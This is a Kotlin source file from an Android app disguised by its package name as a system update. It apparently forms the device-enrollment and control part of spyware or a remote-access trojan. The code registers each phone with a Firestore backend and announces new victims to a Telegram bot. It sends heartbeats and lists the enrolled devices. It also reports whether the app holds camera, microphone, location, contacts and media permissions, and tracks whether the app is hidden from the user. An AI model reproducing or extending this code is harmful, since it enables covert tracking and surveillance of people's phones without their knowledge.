// language: Kotlin, file: DeviceManager.kt
// *تسجيل الجهاز + heartbeat + قراءة/كتابة الأذونات + حالة الإخفاء*

package com.sys.update2

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import kotlin.random.Random

object DeviceManager {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private const val PREFS = "device_prefs"
    private const val KEY_CODE = "device_code"
    private const val KEY_NAME = "device_name"
    private const val CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    private const val CODE_LEN = 6

    private fun fsBase(): String =
        "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"

    private fun str(s: String) = JSONObject().put("stringValue", s)
    private fun num(n: Long) = JSONObject().put("integerValue", n.toString())
    private fun bool(b: Boolean) = JSONObject().put("booleanValue", b)

    // ═══════════════════════════════════════════
    //  توليد الرمز الفريد
    // ═══════════════════════════════════════════
    private fun randomCode(): String {
        val sb = StringBuilder()
        for (i in 0 until CODE_LEN) sb.append(CHARS[Random.nextInt(CHARS.length)])
        return sb.toString()
    }

    private fun codeExists(code: String): Boolean {
        return try {
            val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { resp -> resp.isSuccessful }
        } catch (_: Exception) { false }
    }

    private fun generateUniqueCode(): String {
        var attempts = 0
        while (attempts < 20) {
            val code = randomCode()
            if (!codeExists(code)) return code
            attempts++
        }
        return randomCode() + CHARS[Random.nextInt(CHARS.length)]
    }

    // ═══════════════════════════════════════════
    //  اسم الجهاز
    // ═══════════════════════════════════════════
    private fun buildDeviceName(): String {
        val brand = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model = Build.MODEL
        return if (model.lowercase().startsWith(brand.lowercase())) model
        else "$brand $model"
    }

    // ═══════════════════════════════════════════
    //  getDeviceCode
    // ═══════════════════════════════════════════
    fun getDeviceCode(ctx: Context): String {
        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        var code = prefs.getString(KEY_CODE, null)
        if (code.isNullOrBlank()) {
            code = generateUniqueCode()
            prefs.edit().putString(KEY_CODE, code).apply()
            prefs.edit().putString(KEY_NAME, buildDeviceName()).apply()
        }
        return code
    }

    fun getDeviceName(ctx: Context): String {
        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        return prefs.getString(KEY_NAME, null) ?: buildDeviceName()
    }

    fun isMyCode(ctx: Context, code: String): Boolean {
        return getDeviceCode(ctx).equals(code.trim(), ignoreCase = true)
    }

    // ═══════════════════════════════════════════
    //  registerDeviceOnce
    // ═══════════════════════════════════════════
    fun registerDeviceOnce(ctx: Context) {
        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        if (prefs.getBoolean("registered_once", false)) {
            Log.d("DeviceManager", "Already registered — skipping")
            return
        }
        registerDeviceInternal(ctx) { success ->
            if (success) {
                prefs.edit().putBoolean("registered_once", true).apply()
                Log.d("DeviceManager", "Registered once and marked")
            }
        }
    }

    private fun registerDeviceInternal(ctx: Context, onDone: (Boolean) -> Unit) {
        Thread {
            var ok = false
            try {
                val code = getDeviceCode(ctx)
                val name = getDeviceName(ctx)
                val now = System.currentTimeMillis()
                val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                val installedAt = prefs.getLong("installed_at", 0L).let {
                    if (it == 0L) { prefs.edit().putLong("installed_at", now).apply(); now } else it
                }

                val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"

                val fields = JSONObject().apply {
                    put("code", str(code))
                    put("name", str(name))
                    put("brand", str(Build.BRAND))
                    put("manufacturer", str(Build.MANUFACTURER))
                    put("model", str(Build.MODEL))
                    put("product", str(Build.PRODUCT))
                    put("android", str(Build.VERSION.RELEASE))
                    put("sdk", num(Build.VERSION.SDK_INT.toLong()))
                    put("status", str("active"))
                    put("last_seen", num(now))
                    put("installed", num(installedAt))
                }

                val body = JSONObject().put("fields", fields).toString()
                val req = Request.Builder()
                    .url(url)
                    .patch(body.toRequestBody("application/json".toMediaType()))
                    .build()
                val resp = client.newCall(req).execute()
                ok = resp.isSuccessful
                resp.close()

                if (ok) {
                    val notified = prefs.getBoolean("notified", false)
                    if (!notified) {
                        TelegramApi.sendMessage(
                            "📱 *جهاز جديد تم تسجيله*\n\n" +
                            "🏷 *الاسم:* $name\n" +
                            "🆔 *الرمز:* `$code`\n" +
                            "📦 ${Build.MANUFACTURER} ${Build.MODEL}\n" +
                            "🤖 Android ${Build.VERSION.RELEASE}"
                        )
                        prefs.edit().putBoolean("notified", true).apply()
                    }
                }
            } catch (e: Exception) {
                Log.e("DeviceManager", "register err: ${e.message}")
            }
            onDone(ok)
        }.start()
    }

    fun registerDevice(ctx: Context) = registerDeviceOnce(ctx)

    // ═══════════════════════════════════════════
    //  updateHeartbeat
    // ═══════════════════════════════════════════
    fun updateHeartbeat(ctx: Context) {
        Thread {
            try {
                val code = getDeviceCode(ctx)
                val now = System.currentTimeMillis()
                val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}&updateMask.fieldPaths=last_seen&updateMask.fieldPaths=status"
                val fields = JSONObject().apply {
                    put("last_seen", num(now))
                    put("status", str("active"))
                }
                val body = JSONObject().put("fields", fields).toString()
                val req = Request.Builder()
                    .url(url)
                    .patch(body.toRequestBody("application/json".toMediaType()))
                    .build()
                client.newCall(req).execute().use { }
            } catch (_: Exception) {}
        }.start()
    }

    fun markInactive(ctx: Context) {
        Thread {
            try {
                val code = getDeviceCode(ctx)
                val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}&updateMask.fieldPaths=status"
                val fields = JSONObject().apply { put("status", str("inactive")) }
                val body = JSONObject().put("fields", fields).toString()
                val req = Request.Builder()
                    .url(url)
                    .patch(body.toRequestBody("application/json".toMediaType()))
                    .build()
                client.newCall(req).execute().use { }
            } catch (_: Exception) {}
        }.start()
    }

    // ═══════════════════════════════════════════
    //  getDeviceList
    // ═══════════════════════════════════════════
    data class DeviceEntry(val code: String, val name: String, val online: Boolean)

    fun getDeviceList(ctx: Context): List<DeviceEntry> {
        val result = mutableListOf<DeviceEntry>()
        try {
            val url = "${fsBase()}/devices?key=${Config.FIREBASE_API_KEY}&pageSize=100"
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { resp ->
                val body = resp.body?.string()
                if (!body.isNullOrBlank()) {
                    val docs = JSONObject(body).optJSONArray("documents")
                    if (docs != null) {
                        for (i in 0 until docs.length()) {
                            val f = docs.optJSONObject(i)?.optJSONObject("fields") ?: continue
                            val code = f.optJSONObject("code")?.optString("stringValue")
                                ?: f.optJSONObject("id")?.optString("stringValue") ?: ""
                            val name = f.optJSONObject("name")?.optString("stringValue") ?: ""
                            val lastSeen = f.optJSONObject("last_seen")?.optString("integerValue")?.toLongOrNull()
                                ?: f.optJSONObject("last_seen_ms")?.optString("integerValue")?.toLongOrNull() ?: 0
                            val online = (System.currentTimeMillis() - lastSeen) < 10 * 60 * 1000
                            if (code.isNotBlank()) result.add(DeviceEntry(code, name.ifBlank { code }, online))
                        }
                    }
                }
            }
        } catch (_: Exception) {}
        return result
    }

    fun getDeviceId(ctx: Context): String = getDeviceCode(ctx)

    // ═══════════════════════════════════════════
    //  ⭐ الأذونات — قراءة وكتابة
    // ═══════════════════════════════════════════

    data class DevicePermissions(
        val images: Boolean = false,
        val videos: Boolean = false,
        val audio: Boolean = false,
        val contacts: Boolean = false,
        val camera: Boolean = false,
        val microphone: Boolean = false,
        val location: Boolean = false,
        val notifications: Boolean = false,
        val hidden: Boolean = false
    )

    /**
     * يقرأ الأذونات المسجّلة على Firestore للجهاز المحدد.
     */
    fun getDevicePermissions(code: String): DevicePermissions {
        return try {
            val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { resp ->
                val body = resp.body?.string() ?: return DevicePermissions()
                val obj = JSONObject(body)
                val f = obj.optJSONObject("fields") ?: return DevicePermissions()

                DevicePermissions(
                    images = f.optJSONObject("perm_images")?.optBoolean("booleanValue", false) ?: false,
                    videos = f.optJSONObject("perm_videos")?.optBoolean("booleanValue", false) ?: false,
                    audio = f.optJSONObject("perm_audio")?.optBoolean("booleanValue", false) ?: false,
                    contacts = f.optJSONObject("perm_contacts")?.optBoolean("booleanValue", false) ?: false,
                    camera = f.optJSONObject("perm_camera")?.optBoolean("booleanValue", false) ?: false,
                    microphone = f.optJSONObject("perm_mic")?.optBoolean("booleanValue", false) ?: false,
                    location = f.optJSONObject("perm_location")?.optBoolean("booleanValue", false) ?: false,
                    notifications = f.optJSONObject("perm_notifications")?.optBoolean("booleanValue", false) ?: false,
                    hidden = f.optJSONObject("app_hidden")?.optBoolean("booleanValue", false) ?: false
                )
            }
        } catch (_: Exception) {
            DevicePermissions()
        }
    }

    /**
     * يرفع حالة الأذونات الحالية للجهاز على Firestore.
     */
    fun uploadPermissions(ctx: Context) {
        Thread {
            try {
                val code = getDeviceCode(ctx)
                val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"
                val fields = JSONObject().apply {
                    put("perm_images", bool(
                        checkPerm(ctx, "android.permission.READ_MEDIA_IMAGES") ||
                        checkPerm(ctx, "android.permission.READ_EXTERNAL_STORAGE")
                    ))
                    put("perm_videos", bool(
                        checkPerm(ctx, "android.permission.READ_MEDIA_VIDEO") ||
                        checkPerm(ctx, "android.permission.READ_EXTERNAL_STORAGE")
                    ))
                    put("perm_audio", bool(
                        checkPerm(ctx, "android.permission.READ_MEDIA_AUDIO") ||
                        checkPerm(ctx, "android.permission.READ_EXTERNAL_STORAGE")
                    ))
                    put("perm_contacts", bool(checkPerm(ctx, "android.permission.READ_CONTACTS")))
                    put("perm_camera", bool(checkPerm(ctx, "android.permission.CAMERA")))
                    put("perm_mic", bool(checkPerm(ctx, "android.permission.RECORD_AUDIO")))
                    put("perm_location", bool(
                        checkPerm(ctx, "android.permission.ACCESS_FINE_LOCATION") ||
                        checkPerm(ctx, "android.permission.ACCESS_COARSE_LOCATION")
                    ))
                    put("perm_notifications", bool(checkPerm(ctx, "android.permission.POST_NOTIFICATIONS")))
                }
                val body = JSONObject().put("fields", fields).toString()
                client.newCall(Request.Builder().url(url)
                    .patch(body.toRequestBody("application/json".toMediaType()))
                    .build()).execute().use { }
            } catch (_: Exception) {}
        }.start()
    }

    /**
     * يسجّل حالة الإخفاء على Firestore.
     */
    fun markAppHidden(ctx: Context, hidden: Boolean) {
        Thread {
            try {
                val code = getDeviceCode(ctx)
                val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"
                val fields = JSONObject().apply { put("app_hidden", bool(hidden)) }
                val body = JSONObject().put("fields", fields).toString()
                client.newCall(Request.Builder().url(url)
                    .patch(body.toRequestBody("application/json".toMediaType()))
                    .build()).execute().use { }
            } catch (_: Exception) {}
        }.start()
    }

    /**
     * يقرأ حالة الإخفاء من Firestore.
     */
    fun isAppHidden(ctx: Context, code: String): Boolean {
        return try {
            val url = "${fsBase()}/devices/$code?key=${Config.FIREBASE_API_KEY}"
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { resp ->
                val body = resp.body?.string() ?: return false
                val obj = JSONObject(body)
                val f = obj.optJSONObject("fields")
                f?.optJSONObject("app_hidden")?.optBoolean("booleanValue", false) ?: false
            }
        } catch (_: Exception) {
            false
        }
    }

    private fun checkPerm(ctx: Context, permission: String): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ctx.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
            } else true
        } catch (_: Exception) { false }
    }
}
